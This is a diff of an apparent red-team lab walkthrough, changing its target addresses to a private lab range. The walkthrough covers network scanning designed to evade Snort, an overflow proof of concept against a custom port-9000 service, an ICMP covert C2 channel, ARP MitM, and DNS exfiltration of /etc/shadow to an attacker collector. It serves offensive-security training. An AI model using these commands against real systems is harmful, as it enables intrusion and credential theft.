@@ -2,10 +2,10 @@
 
 ## Scenario
 
-You have just obtained shell access to an internal host at `10.0.0.1`.
+You have just obtained shell access to an internal host at `192.168.56.1`.
 Your operators want you to:
 
-1. Map the `10.0.0.0/24` segment without triggering Snort signatures
+1. Map the `192.168.56.0/24` segment without triggering Snort signatures
 2. Identify a host running a custom binary service on port 9000
 3. Exploit a vulnerability in that service
 4. Establish a covert C2 channel back to your operator machine
@@ -19,7 +19,7 @@ Your operators want you to:
 ```
 [Operator]──────────────────────────────────────────────┐
                                                          │ ICMP/DNS only
-[Attacker: 10.0.0.1] ──── (10.0.0.0/24) ──── [Target: 10.0.0.2]
+[Attacker: 192.168.56.1] ──── (192.168.56.0/24) ──── [Target: 192.168.56.2]
                                   │
                             [Other hosts?]
                            (your job to find)
@@ -48,23 +48,23 @@ Your operators want you to:
 
 ```bash
 # ARP sweep (stealthier than ICMP for local /24)
-sudo python3 module2/host_discovery.py 10.0.0.0/24 --method arp
+sudo python3 module2/host_discovery.py 192.168.56.0/24 --method arp
 
 # If ARP sweep is blocked, fall back to ICMP with jitter
-sudo python3 module2/host_discovery.py 10.0.0.0/24 --method icmp
+sudo python3 module2/host_discovery.py 192.168.56.0/24 --method icmp
 
 # Once hosts found, SYN scan port 9000 specifically
-sudo python3 module2/syn_scanner.py 10.0.0.2 --ports 9000
+sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 9000
 ```
 
 ### Step 2: Service Identification
 
 ```bash
 # Banner grab on port 9000 using netcat
-echo -e '\xdc\x34\x01\x00\x00' | nc -q1 10.0.0.2 9000 | xxd
+echo -e '\xdc\x34\x01\x00\x00' | nc -q1 192.168.56.2 9000 | xxd
 
 # Or using the toolkit's recon module:
-sudo python3 redteam_toolkit/cli.py recon --target 10.0.0.2 --ports 9000
+sudo python3 redteam_toolkit/cli.py recon --target 192.168.56.2 --ports 9000
 ```
 
 Expected: Magic bytes `0xDC34` in response — this is the DC34 custom protocol.
@@ -74,7 +74,7 @@ See `module5/custom_proto.py` for the protocol definition.
 
 ```bash
 # Start the custom fuzzer against port 9000
-sudo python3 module5/custom_fuzzer.py --target 10.0.0.2 --port 9000
+sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --port 9000
 
 # The fuzzer should find: opcode=0xFF + payload > 64 bytes = crash
 # Manual PoC once you identify the bug:
@@ -85,7 +85,7 @@ opcode = 0xFF
 length = 100            # > 64 bytes triggers the overflow
 payload = b'A' * length
 frame = struct.pack('>HBH', magic, opcode, length) + payload
-s = socket.create_connection(('10.0.0.2', 9000))
+s = socket.create_connection(('192.168.56.2', 9000))
 s.sendall(frame)
 print('[+] Sent exploit frame')
 s.close()
@@ -99,12 +99,12 @@ s.close()
 sudo python3 module6/icmp_agent.py --iface eth0
 
 # On attacker — connect to the agent
-sudo python3 module6/icmp_tunnel.py --target 10.0.0.2
+sudo python3 module6/icmp_tunnel.py --target 192.168.56.2
 
 # Test commands:
-[10.0.0.2]> whoami
-[10.0.0.2]> id
-[10.0.0.2]> uname -a
+[192.168.56.2]> whoami
+[192.168.56.2]> id
+[192.168.56.2]> uname -a
 ```
 
 ### Step 5: DNS Exfiltration
@@ -114,7 +114,7 @@ sudo python3 module6/icmp_tunnel.py --target 10.0.0.2
 sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/shadow_exfil
 
 # On target (via ICMP C2 or direct shell) — run the exfiltrator
-sudo python3 module6/dns_exfil.py --file /etc/shadow --collector 10.0.0.1
+sudo python3 module6/dns_exfil.py --file /etc/shadow --collector 192.168.56.1
 
 # Verify received file on attacker
 cat /tmp/shadow_exfil
@@ -124,17 +124,17 @@ cat /tmp/shadow_exfil
 
 ```bash
 # Stop ICMP agent on target:
-[10.0.0.2]> pkill -f icmp_agent
+[192.168.56.2]> pkill -f icmp_agent
 
 # If ARP poisoning was used, restore caches:
-sudo arp -d 10.0.0.254  # flush gateway entry
-sudo arp -d 10.0.0.2    # flush target entry
+sudo arp -d 192.168.56.254  # flush gateway entry
+sudo arp -d 192.168.56.2    # flush target entry
 
 # Remove any files dropped on target:
-[10.0.0.2]> rm -f /tmp/pwned /tmp/*.pcap
+[192.168.56.2]> rm -f /tmp/pwned /tmp/*.pcap
 
 # Verify no lingering python processes:
-[10.0.0.2]> ps aux | grep python
+[192.168.56.2]> ps aux | grep python
 ```
 
 ---
@@ -145,19 +145,19 @@ The `redteam_toolkit/` package wraps all modules into a single CLI:
 
 ```bash
 # Full recon
-sudo python3 redteam_toolkit/cli.py recon --target 10.0.0.0/24
+sudo python3 redteam_toolkit/cli.py recon --target 192.168.56.0/24
 
 # ARP MitM
-sudo python3 redteam_toolkit/cli.py mitm --victim 10.0.0.2 --gateway 10.0.0.254
+sudo python3 redteam_toolkit/cli.py mitm --victim 192.168.56.2 --gateway 192.168.56.254
 
 # Fuzz port 9000
-sudo python3 redteam_toolkit/cli.py fuzz --target 10.0.0.2 --port 9000
+sudo python3 redteam_toolkit/cli.py fuzz --target 192.168.56.2 --port 9000
 
 # ICMP C2
-sudo python3 redteam_toolkit/cli.py c2 --target 10.0.0.2
+sudo python3 redteam_toolkit/cli.py c2 --target 192.168.56.2
 
 # DNS exfil
-sudo python3 redteam_toolkit/cli.py exfil --file /etc/shadow --collector 10.0.0.1
+sudo python3 redteam_toolkit/cli.py exfil --file /etc/shadow --collector 192.168.56.1
 ```
 
 ---
